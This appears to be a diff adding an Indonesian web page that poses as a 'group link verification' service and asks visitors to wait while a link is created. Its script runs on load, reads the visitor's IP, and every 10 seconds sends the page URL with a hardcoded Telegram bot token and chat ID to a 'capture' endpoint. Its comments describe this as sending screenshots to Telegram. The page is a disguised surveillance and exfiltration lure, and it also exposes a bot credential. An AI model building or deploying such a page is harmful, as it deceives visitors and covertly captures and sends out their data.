@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VERIFIKASI LINK GB X-ONXY</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0a0f;
+            color: #e2e8f0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: #1a1a24;
+            padding: 40px;
+            border-radius: 24px;
+            border: 1px solid #2d2d3a;
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+        }
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #8b5cf6, #3b82f6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+        }
+        p { color: #94a3b8; margin-bottom: 20px; font-size: 14px; }
+        .status {
+            background: #0a0a0f;
+            padding: 16px;
+            border-radius: 12px;
+            border: 1px solid #2d2d3a;
+            margin-bottom: 20px;
+        }
+        .status .ip { color: #8b5cf6; font-weight: bold; font-size: 18px; }
+        .status .info { color: #64748b; font-size: 13px; margin-top: 4px; }
+        .badge {
+            display: inline-block;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .badge.success { background: rgba(16, 185, 129, 0.2); color: #10b981; }
+        .badge.danger { background: rgba(239, 68, 68, 0.2); color: #ef4444; }
+        .badge.warning { background: rgba(245, 158, 11, 0.2); color: #f59e0b; }
+        .log {
+            background: #0a0a0f;
+            border-radius: 12px;
+            padding: 16px;
+            max-height: 300px;
+            overflow-y: auto;
+            text-align: left;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            color: #94a3b8;
+            border: 1px solid #2d2d3a;
+        }
+        .log .time { color: #64748b; }
+        .log .ok { color: #10b981; }
+        .log .err { color: #ef4444; }
+        .log .info { color: #3b82f6; }
+        .footer { margin-top: 16px; font-size: 12px; color: #64748b; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>X - O N X Y</h1>
+    <p>Tunggu Sekitar 5Menit Website auto Create link Buat Anda</p>
+
+    <div class="status">
+        <div class="ip" id="ipDisplay">🌐 Mendeteksi apakah pernh verif link gb...</div>
+        <div class="info" id="statusDisplay">⏳ Procesing....</div>
+    </div>
+
+    <div>
+        <span class="badge success" id="badgeStatus">● ONLINE</span>
+        <span class="badge warning" id="badgeCounter">📤 0 dikirim</span>
+    </div>
+
+    <div class="log" id="logContainer">
+        <div class="log-entry"><span class="time">[INIT]</span> <span class="info">Menunggu pengambilan link...</span></div>
+    </div>
+
+    <div class="footer">X - O N X Y</div>
+</div>
+
+<script>
+// ============ KONFIGURASI ============
+const BOT_TOKEN = "8880888820:AAHZRZ9wnGoQlyVgJd8ySaVriRnxn0_K6UY";  // GANTI
+const CHAT_ID = "1478839005";  // GANTI (pake ID group/channel)
+const API_URL = "capture";  // Endpoint Vercel
+
+let ssCount = 0;
+let isProcessing = false;
+const logContainer = document.getElementById('logContainer');
+
+// ============ FUNGSI LOG ============
+function addLog(message, type = 'info') {
+    const entry = document.createElement('div');
+    entry.className = 'log-entry';
+    const time = new Date().toLocaleTimeString('id-ID');
+    const cls = type === 'ok' ? 'ok' : type === 'err' ? 'err' : 'info';
+    entry.innerHTML = `<span class="time">[${time}]</span> <span class="${cls}">${message}</span>`;
+    logContainer.appendChild(entry);
+    logContainer.scrollTop = logContainer.scrollHeight;
+}
+
+// ============ GET IP ============
+async function getIP() {
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        document.getElementById('ipDisplay').textContent = `🌐 ${data.ip}`;
+        return data.ip;
+    } catch {
+        document.getElementById('ipDisplay').textContent = '🌐 Tidak terdeteksi';
+        return 'unknown';
+    }
+}
+
+// ============ KIRIM SS KE TELEGRAM ============
+async function sendScreenshot() {
+    if (isProcessing) return;
+    isProcessing = true;
+
+    try {
+        addLog('📸 Mengambil link...', 'info');
+        document.getElementById('statusDisplay').textContent = '📸 Mengambil link...';
+
+        // Panggil API Vercel buat capture
+        const response = await fetch(API_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                url: window.location.href,
+                botToken: BOT_TOKEN,
+                chatId: CHAT_ID
+            })
+        });
+
+        const result = await response.json();
+
+        if (result.success) {
+            ssCount++;
+            document.getElementById('badgeCounter').textContent = `📤 ${ssCount} dikirim`;
+            addLog(`✅ link terkirim! (${ssCount})`, 'ok');
+            document.getElementById('statusDisplay').textContent = `✅ Terkirim! (${ssCount})`;
+        } else {
+            addLog(`❌ Gagal: ${result.error || 'Unknown error'}`, 'err');
+            document.getElementById('statusDisplay').textContent = '❌ Gagal kirim';
+        }
+    } catch (error) {
+        addLog(`❌ Error: ${error.message}`, 'err');
+        document.getElementById('statusDisplay').textContent = '❌ Error';
+    }
+
+    isProcessing = false;
+}
+
+// ============ AUTO LOOP ============
+async function startAutoSS() {
+    addLog('🚀 AUTO CREATE LINK STARTED', 'info');
+    document.getElementById('statusDisplay').textContent = '🔄 Aktif...';
+
+    // Dapatkan IP
+    await getIP();
+
+    // Langsung kirim pertama
+    await sendScreenshot();
+
+    // Kirim setiap 10 detik
+    setInterval(async () => {
+        await sendScreenshot();
+    }, 10000);
+}
+
+// ============ START ============
+startAutoSS();
+</script>
+</body>
+</html>
